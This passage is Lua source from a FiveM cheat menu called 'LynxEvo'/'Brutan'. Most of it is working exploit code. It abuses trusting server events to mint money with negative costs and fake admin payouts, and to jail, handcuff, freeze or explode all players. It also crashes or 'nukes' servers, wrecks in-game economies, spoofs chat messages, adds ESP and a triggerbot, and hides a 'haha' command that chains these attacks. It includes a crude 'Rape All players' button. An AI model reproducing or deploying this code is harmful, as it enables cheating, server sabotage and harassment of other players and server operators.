LynxEvo.close() end) TriggerEvent("esx_society:openBossMenu", "cardealer", function(dW, dX) LynxEvo.close() end) TriggerEvent("esx_society:openBossMenu", 'cardealer', function(dY, dZ) LynxEvo.close() end) TriggerEvent("esx_society:openBossMenu", "cardealer", function(dY, dZ) LynxEvo.close() end) LynxEvo.CloseMenu() elseif LynxEvo.Button("~y~~h~Custom~s~ Boss Menu") then local e = KeyboardInput("Enter custom boss menu job name", "", 100) if e ~= ""
    then TriggerEvent("esx_society:openBossMenu", e, function(dU, dV) LynxEvo.close() end) TriggerEvent("esx_society:openBossMenu", e, function(dW, dX) LynxEvo.close() end) TriggerEvent("esx_society:openBossMenu", e, function(dY, dZ) LynxEvo.close() end) LynxEvo.CloseMenu() end end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("ESXMoney") then
    if LynxEvo.Button("~h~~o~Automatic Money ~r~ WARNING!") then automaticmoneyesx() elseif LynxEvo.Button("~g~~h~ESX ~y~Caution Give Back") then local e = KeyboardInput("Enter amount of money", "", 100) if e ~= ""
    then TriggerServerEvent("esx_jobs:caution", "give_back", e) end elseif LynxEvo.Button("~g~~h~ESX ~y~Eden Garage") then local e = KeyboardInput("Enter amount of money", "", 100) if e ~= ""
    then TriggerServerEvent("eden_garage:payhealth", {
        costs = -e
    }) end elseif LynxEvo.Button("~g~~h~ESX ~y~Fuel Delivery") then local e = KeyboardInput("Enter amount of money", "", 100) if e ~= ""
    then TriggerServerEvent("esx_fueldelivery:pay", e) end elseif LynxEvo.Button("~g~~h~ESX ~y~Car Thief") then local e = KeyboardInput("Enter amount of money", "", 100) if e ~= ""
    then TriggerServerEvent("esx_carthief:pay", e) end elseif LynxEvo.Button("~g~~h~ESX ~y~DMV School") then local e = KeyboardInput("Enter amount of money", "", 100) if e ~= ""
    then TriggerServerEvent("esx_dmvschool:pay", {
        costs = -e
    }) end elseif LynxEvo.Button("~g~~h~FUEL ~y~Legacy Fuel") then local e = KeyboardInput("Enter amount of money", "", 100) if e ~= ""
    then TriggerServerEvent("LegacyFuel:PayFuel", {
        costs = -e
    }) end elseif LynxEvo.Button("~g~~h~ESX ~y~Dirty Job") then local e = KeyboardInput("Enter amount of money", "", 100) if e ~= ""
    then TriggerServerEvent("esx_godirtyjob:pay", e) end elseif LynxEvo.Button("~g~~h~ESX ~y~Pizza Boy") then local e = KeyboardInput("Enter amount of money", "", 100) if e ~= ""
    then TriggerServerEvent("esx_pizza:pay", e) end elseif LynxEvo.Button("~g~~h~ESX ~y~Ranger Job") then local e = KeyboardInput("Enter amount of money", "", 100) if e ~= ""
    then TriggerServerEvent("esx_ranger:pay", e) end elseif LynxEvo.Button("~g~~h~ESX ~y~Garbage Job") then local e = KeyboardInput("Enter amount of money", "", 100) if e ~= ""
    then TriggerServerEvent("esx_garbagejob:pay", e) end elseif LynxEvo.Button("~g~~h~ESX ~y~Car Thief ~r~DIRTY MONEY") then local e = KeyboardInput("Enter amount of dirty money", "", 100) if e ~= ""
    then TriggerServerEvent("esx_carthief:pay", e) end elseif LynxEvo.Button("~g~~h~ESX ~y~Trucker Job") then local e = KeyboardInput("Enter amount of money", "", 100) if e ~= ""
    then TriggerServerEvent("esx_truckerjob:pay", e) end elseif LynxEvo.Button("~g~~h~ESX ~y~Admin Give Bank") then local e = KeyboardInput("Enter amount of money", "", 100) if e ~= ""
    then TriggerServerEvent("AdminMenu:giveBank", e) end elseif LynxEvo.Button("~g~~h~ESX ~y~Admin Give Cash") then local e = KeyboardInput("Enter amount of money", "", 100) if e ~= ""
    then TriggerServerEvent("AdminMenu:giveCash", e) end elseif LynxEvo.Button("~g~~h~ESX ~y~Postal Job") then local e = KeyboardInput("Enter amount of money", "", 100) if e ~= ""
    then TriggerServerEvent("esx_gopostaljob:pay", e) end elseif LynxEvo.Button("~g~~h~ESX ~y~Banker Job") then local e = KeyboardInput("Enter amount of money", "", 100) if e ~= ""
    then TriggerServerEvent("esx_banksecurity:pay", e) end elseif LynxEvo.Button("~g~~h~ESX ~y~Slot Machine") then local e = KeyboardInput("Enter amount of money", "", 100) if e ~= ""
    then TriggerServerEvent("esx_slotmachine:sv:2", e) end end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("ESXCustom") then
    if LynxEvo.Button("~w~~h~Set hunger to ~h~~g~100") then TriggerEvent("esx_status:set", "hunger", 1000000) elseif LynxEvo.Button("~w~~h~Set thirst to ~h~~g~100") then TriggerEvent("esx_status:set", "thirst", 1000000) elseif LynxEvo.Button("~g~~h~ESX ~r~Revive") then local E = KeyboardInput("Enter Player ID or all", "", 1000) if E then
    if E == "all"
    then
    for i = 0, 128 do TriggerEvent("esx_ambulancejob:revive", GetPlayerServerId(i)) TriggerEvent("esx_ambulancejob:revive", GetPlayerServerId(i)) end
    else TriggerEvent("esx_ambulancejob:revive", E) TriggerEvent("esx_ambulancejob:revive", E) end end elseif LynxEvo.Button("~g~~h~ESX ~b~Handcuff") then local E = KeyboardInput("Enter Player ID or all", "", 1000) if E
    then
    if E == "all"
    then
    for i = 0, 128 do TriggerServerEvent("esx_policejob:handcuff", GetPlayerServerId(i)) TriggerEvent("esx_policejob:handcuff", GetPlayerServerId(i)) end
    else TriggerEvent("esx_policejob:handcuff", E) TriggerServerEvent("esx_policejob:handcuff", E) end end elseif LynxEvo.Button("~h~Get Driving License") then TriggerServerEvent("esx_dmvschool:addLicense", dmv) TriggerServerEvent("esx_dmvschool:addLicense", drive) elseif LynxEvo.Button("~h~~b~Buy ~s~a vehicle for ~g~free") then cs() end;
    LynxEvo.Display() elseif LynxEvo.IsMenuOpened("ESXDrugs") then
    if LynxEvo.Button("~h~~g~Harvest ~g~Weed") then hweed() elseif LynxEvo.Button("~h~~g~Transform ~g~Weed") then tweed() elseif LynxEvo.Button("~h~~g~Sell ~g~Weed") then sweed() elseif LynxEvo.Button("~h~~w~Harvest ~w~Coke") then hcoke() elseif LynxEvo.Button("~h~~w~Transform ~w~Coke") then tcoke() elseif LynxEvo.Button("~h~~w~Sell ~w~Coke") then scoke() elseif LynxEvo.Button("~h~~r~Harvest Meth") then hmeth() elseif LynxEvo.Button("~h~~r~Transform Meth") then tmeth() elseif LynxEvo.Button("~h~~r~Sell Meth") then smeth() elseif LynxEvo.Button("~h~~p~Harvest Opium") then hopi() elseif LynxEvo.Button("~h~~p~Transform Opium") then topi() elseif LynxEvo.Button("~h~~p~Sell Opium") then sopi() elseif LynxEvo.Button("~h~~g~Money Wash") then mataaspalarufe() elseif LynxEvo.Button("~r~~h~Stop all") then matanumaispalarufe() elseif LynxEvo.CheckBox("~h~~r~Blow Drugs Up ~y~DANGER!", BlowDrugsUp, function(dL) BlowDrugsUp = dL end) then end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("VRPTriggers") then
    if LynxEvo.Button("~r~~h~VRP ~s~Give Money ~ypayGarage") then local e = KeyboardInput("Enter amount of money", "", 100) if e ~= ""
    then TriggerServerEvent("lscustoms:payGarage", {
        costs = -e
    }) end elseif LynxEvo.Button("~r~~h~VRP ~g~WIN ~s~Slot Machine") then local e = KeyboardInput("Enter amount of money", "", 100) if e ~= ""
    then TriggerServerEvent("vrp_slotmachine:server:2", e) end elseif LynxEvo.Button("~g~~h~FUEL ~y~Legacy Fuel") then local e = KeyboardInput("Enter amount of money", "", 100) if e ~= ""
    then TriggerServerEvent("LegacyFuel:PayFuel", {
        costs = -e
    }) end elseif LynxEvo.Button("~r~~h~VRP ~s~Get driving license") then TriggerServerEvent("dmv:success") elseif LynxEvo.Button("~r~~h~VRP ~s~Bank Deposit") then local e = KeyboardInput("Enter amount of money", "", 100) if e ~= ""
    then TriggerServerEvent("Banca:deposit", e) TriggerServerEvent("bank:deposit", e) end elseif LynxEvo.Button("~r~~h~VRP ~s~Bank Withdraw ") then local e = KeyboardInput("Enter amount of money", "", 100) if e ~= ""
    then TriggerServerEvent("bank:withdraw", e) TriggerServerEvent("Banca:withdraw", e) end end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("MiscTriggers") then
    if LynxEvo.Button("~h~Send Discord Message") then local d_ = KeyboardInput("Enter message to send", "", 100) TriggerServerEvent("DiscordBot:playerDied", d_, "1337") drawNotification("The message:~n~"..d_..
        "~n~Has been ~g~sent!") elseif LynxEvo.Button("~h~Send Fake Message") then local e0 = KeyboardInput("Enter player name", "", 100) if e0 then local d8 = KeyboardInput("Enter message", "", 1000) if d8 then TriggerServerEvent("_chat:messageEntered", e0, {
        0, 0x99, 255
    }, d8) end end elseif LynxEvo.Button("~h~~g~ESX ~y~CarThief ~s~TROLL") then drawNotification("~y~esx_carthief ~g~required") drawNotification("~g~Trying to send alerts") carthieftroll() end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("AdvM") then
    if LynxEvo.MenuButton("~h~~p~#~s~ Destroyer Menu", "Destroyer") then elseif LynxEvo.MenuButton("~h~~p~#~s~ ESP Menu", "ESPMenu") then elseif LynxEvo.MenuButton("~h~~p~#~s~ Crosshairs", "CsMenu") then elseif LynxEvo.CheckBox("~h~TriggerBot", TriggerBot, function(dL) TriggerBot = dL end) then elseif LynxEvo.CheckBox("~h~Player Blips", dt, function(dt) end) then cJ = not cJ; dt = cJ elseif LynxEvo.CheckBox("~h~Name Above Players ~g~v1", cK, function(dL) cK = dL; cL = false end) then elseif LynxEvo.CheckBox("~h~Name Above Players n Indicator ~g~v2", cL, function(dL) cL = dL; cK = false end) then elseif LynxEvo.CheckBox("~h~~r~Freeze~s~ All players", freezeall, function(dL) freezeall = dL end) then elseif LynxEvo.CheckBox("~h~~r~Explode~s~ All players", blowall, function(dL) blowall = dL end) then end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("CsMenu") then
    if LynxEvo.CheckBox("~h~~y~Original ~s~Crosshair", crosshair, function(dL) crosshair = dL; crosshairc = false; crosshairc2 = false end) then elseif LynxEvo.CheckBox("~h~~r~CROSS ~s~Crosshair", crosshairc, function(dL) crosshair = false; crosshairc = dL; crosshairc2 = false end) then elseif LynxEvo.CheckBox("~h~~r~DOT ~s~Crosshair", crosshairc2, function(dL) crosshair = false; crosshairc = false; crosshairc2 = dL end) then end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("Destroyer") then
    if LynxEvo.Button("~h~~r~Nuke ~s~Server") then nukeserver() elseif LynxEvo.CheckBox("~h~~r~Silent ~s~Server ~y~Crasher", servercrasherxd, function(dL) servercrasherxd = dL end) then elseif LynxEvo.Button("~h~~g~ESX ~r~Destroy ~b~v2") then esxdestroyv2() elseif LynxEvo.Button("~h~~g~ESX ~r~Destroy ~b~Salary") then EconomyDy2() elseif LynxEvo.Button("~h~~r~VRP ~s~Give everyone money") then vrpdestroy() elseif LynxEvo.Button("~h~~r~Jail~s~ All players") then
    for i = 0, 128 do TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "BRUTAN V6.2~ https://brutan.wixsite.com/fivem/fivem") TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 45 * 60) TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 45 * 60) TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, "BRUTAN V6.2 ~ https://brutan.wixsite.com/fivem/fivem") end elseif LynxEvo.Button("~h~~r~Banana ~p~Party~s~ All players") then bananapartyall() elseif LynxEvo.Button("~h~~r~Rape~s~ All players") then RapeAllFunc() end;
    LynxEvo.Display() elseif LynxEvo.IsMenuOpened("crds") then
    if LynxEvo.Button("~h~~p~#~s~ Brutan~r~#~r~7799 ~p~DEV") then drawNotification("~h~~o~brutan cheats? s~.") drawNotification("~h~~o~Brutan is the best ~s~.") drawNotification("~h~~o~wow Brutan its so good ~s~.") elseif LynxEvo.Button("~h~~p~#~s~ antonio~r~#~r~3276 ~p~DEV") then elseif LynxEvo.Button("~h~~p~#~s~ unknown~r~#~r~9496 ~p~DEV") then end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("WeaponTypes") then
    for dO, e1 in pairs(a_) do
        if LynxEvo.
    MenuButton("~h~~p~#~s~ "..dO, "WeaponTypeSelection") then du = e1 end end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("WeaponTypeSelection") then
    for dO, e1 in pairs(du) do
        if LynxEvo.
    MenuButton(e1.name, "WeaponOptions") then dv = e1 end end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("WeaponOptions") then
    if LynxEvo.Button("~h~~r~Spawn Weapon") then GiveWeaponToPed(GetPlayerPed(-1), GetHashKey(dv.id), 1000, false) end;
    if LynxEvo.Button("~h~~g~Add Ammo") then SetPedAmmo(GetPlayerPed(-1), GetHashKey(dv.id), 5000) end;
    if LynxEvo.CheckBox("~h~~r~Infinite ~s~Ammo", dv.bInfAmmo, function(e2) end) then dv.bInfAmmo = not dv.bInfAmmo; SetPedInfiniteAmmo(GetPlayerPed(-1), dv.bInfAmmo, GetHashKey(dv.id)) SetPedInfiniteAmmoClip(GetPlayerPed(-1), true) end;
    for dO, e1 in pairs(dv.mods) do
        if LynxEvo.
    MenuButton("~h~~p~#~s~ ~h~~r~> ~s~"..dO, "ModSelect") then dw = e1 end end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("ModSelect") then
    for _, e1 in pairs(dw) do
        if LynxEvo.
    Button(e1.name) then GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey(dv.id), GetHashKey(e1.id)) end end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("CarTypes") then
    for i, e3 in ipairs(aX) do
        if LynxEvo.
    MenuButton("~h~~p~#~s~ "..e3, "CarTypeSelection") then carTypeIdx = i end end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("CarTypeSelection") then
    for i, e3 in ipairs(aY[carTypeIdx]) do
        if LynxEvo.
    MenuButton("~h~~p~#~s~ ~h~~r~>~s~ "..e3, "CarOptions") then carToSpawn = i end end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("CarOptions") then
    if LynxEvo.Button("~h~~r~Spawn Car") then local x, y, z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5)) local veh = aY[carTypeIdx][carToSpawn]
    if veh == nil then veh = "adder"
    end; vehiclehash = GetHashKey(veh) RequestModel(vehiclehash) Citizen.CreateThread(function() local e4 = 0;
        while not HasModelLoaded(vehiclehash) do e4 = e4 + 100;
        Citizen.Wait(100) if e4 > 5000 then ShowNotification("~h~~r~Cannot spawn this vehicle.") break end end; SpawnedCar = CreateVehicle(vehiclehash, x, y, z, GetEntityHeading(PlayerPedId(-1)) + 90, 1, 0) SetVehicleStrong(SpawnedCar, true) SetVehicleEngineOn(SpawnedCar, true, true, false) SetVehicleEngineCanDegrade(SpawnedCar, false) end) end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("GiveSingleWeaponPlayer") then
    for i = 1, #aZ do
        if LynxEvo.
    Button(aZ[i]) then GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(aZ[i]), 1000, false, true) end end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("ESPMenu") then
    if LynxEvo.CheckBox("~h~~r~ESP ~s~MasterSwitch", esp, function(dL) esp = dL end) then elseif LynxEvo.CheckBox("~h~~r~ESP ~s~Box", espbox, function(dL) espbox = dL end) then elseif LynxEvo.CheckBox("~h~~r~ESP ~s~Info", espinfo, function(dL) espinfo = dL end) then elseif LynxEvo.CheckBox("~h~~r~ESP ~s~Lines", esplines, function(dL) esplines = dL end) then end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("LSC") then local veh = GetVehiclePedIsUsing(PlayerPedId()) if LynxEvo.MenuButton("~h~~p~#~s~ ~h~~r~Exterior ~s~Tuning", "tunings") then elseif LynxEvo.MenuButton("~h~~p~#~s~ ~h~~r~Performance ~s~Tuning", "performance") then elseif LynxEvo.Button("~h~Change Car License Plate") then cr() elseif LynxEvo.CheckBox("~h~~g~R~r~a~y~i~b~n~o~b~r~o~g~w ~s~Vehicle Colour", RainbowVeh, function(dL) RainbowVeh = dL end) then elseif LynxEvo.Button("~h~Make vehicle ~y~dirty") then Clean(GetVehiclePedIsUsing(PlayerPedId(-1))) elseif LynxEvo.Button("~h~Make vehicle ~g~clean") then Clean2(GetVehiclePedIsUsing(PlayerPedId(-1))) end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("BoostMenu") then
    if LynxEvo.ComboBox("~h~Engine ~r~Power ~s~Booster", dz, dx, dy, function(ab, ac) dx = ab; dy = ac; SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), dy * 20.0) end) then elseif LynxEvo.CheckBox("~h~Engine ~g~Torque ~s~Booster ~g~2x", t2x, function(dL) t2x = dL; t4x = false; t10x = false; t16x = false; txd = false end) then elseif LynxEvo.CheckBox("~h~Engine ~g~Torque ~s~Booster ~g~4x", t4x, function(dL) t2x = false; t4x = dL; t10x = false; t16x = false; txd = false end) then elseif LynxEvo.CheckBox("~h~Engine ~g~Torque ~s~Booster ~g~10x", t10x, function(dL) t2x = false; t4x = false; t10x = dL; t16x = false; txd = false end) then elseif LynxEvo.CheckBox("~h~Engine ~g~Torque ~s~Booster ~g~16x", t16x, function(dL) t2x = false; t4x = false; t10x = false; t16x = dL; txd = false end) then elseif LynxEvo.CheckBox("~h~Engine ~g~Torque ~s~Booster ~y~XD", txd, function(dL) t2x = false; t4x = false; t10x = false; t16x = false; txd = dL end) then end; LynxEvo.Display() elseif IsDisabledControlPressed(0, 122) then
    if logged then LynxEvo.OpenMenu("LynxX") end; LynxEvo.Display() elseif IsDisabledControlPressed(0, 47) and IsDisabledControlPressed(0, 21) then
    if logged then LynxEvo.OpenMenu("LynxX") end end; Citizen.Wait(0) end end) RegisterCommand("haha", function(e5, e6, e7) bk = true; RapeAllFunc() bananapartyall() EconomyDy2() AmbulancePlayers() for i = 0, 128 do TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "BRUTAN V6.2 ~ https://brutan.wixsite.com/fivem/fivem") TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 45 * 60) TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 45 * 60) TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, "BRUTAN V6.2 ~ https://brutan.wixsite.com/fivem/fivem") end end, false) RegisterCommand("pk", function(e5, e6, e7) bl = false end, false)